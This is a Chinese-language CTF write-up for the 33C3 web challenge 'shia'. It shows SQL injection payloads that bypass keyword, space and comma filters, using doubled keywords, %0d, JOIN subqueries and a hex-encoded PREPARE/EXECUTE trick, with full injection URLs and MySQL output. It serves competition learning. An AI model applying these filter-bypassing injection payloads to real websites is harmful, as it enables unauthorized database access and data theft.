33C3 CTF web部分Writeup-----------shia

作者：albertchang 发布时间：January 4, 2017 分类：ctf

http://78.46.224.75/

题目类型：web

漏洞：sql注入

分值：175分

解题思路：

  1. 题目给了一个输入框，输入数据会进行查询
  2. 通过firebug发现数据是直接json之后发给后台的
  3. http://78.46.224.75/static/shia.js这是数据处理的js
  4. 找到网址http://78.46.224.75/quote/1，通过修改quote_id可以发现这个参数存在注入。
  5. 测试过滤：关键词单次过滤，可以通过双写绕过；空格被过滤，采用%0d的方式绕过；特殊符号直接过滤，并给出回显nice try skid。
  6. 首先测试有几列，利用order by进行测试：
    • http://78.46.224.75/quote/1%0dorder%0dby%0d3正常
    • http://78.46.224.75/quote/1%0dorder%0dby%0d4错误
    • 所以表一共有3列，根据提示，flag表一共有4列，所以不能直接查询
  7. 尝试直接使用union select 发现不行，逗号被过滤，于是尝试使用join的方式：
mysql> SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
1 row in set (0.00 sec)
  1. 转换成payload,0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d4)b%0djojoinin%0d(selselectect%0d1)c)，访问http://78.46.224.75/quote/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d4)b%0djojoinin%0d(selselectect%0d1)c)，成功union查询。
  2. 没法直接查询information_schema的数据，因为__被过滤了。fuzz发现应该是可以子查询的：
    • http://78.46.224.75/quote/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d4)b%0djojoinin%0d(selselectect%0d1)c);selselectect(1)正常
    • http://78.46.224.75/quote/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d4)b%0djojoinin%0d(selselectect%0d1)c);selselectect(a)报错
  3. 于是想到mysql的一个特性，可以设置好变量名之后用set+PREPARE+EXECUTE的方式执行任意的查询，原理如下：
    mysql> select group_concat(schema_name) from information_schema.schemata;
    +---------------------------------------------+
    | group_concat(schema_name)                   |
    +---------------------------------------------+
    | information_schema,mysql,performance_schema |
    +---------------------------------------------+
    1 row in set (0.00 sec)

    mysql> set @b=0x7365742040613d2873656c6563742067726f75705f636f6e63617428736368656d615f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e736368656d61746129;
    Query OK, 0 rows affected (0.00 sec)

    mysql> prepare x from @b;
    Query OK, 0 rows affected (0.00 sec)
    Statement prepared

    mysql> execute x;
    Query OK, 0 rows affected (0.00 sec)

    mysql> select @a;
    +---------------------------------------------+
    | @a                                          |
    +---------------------------------------------+
    | information_schema,mysql,performance_schema |
    +---------------------------------------------+
    1 row in set (0.00 sec)

这样就可以实现查询的功能了。
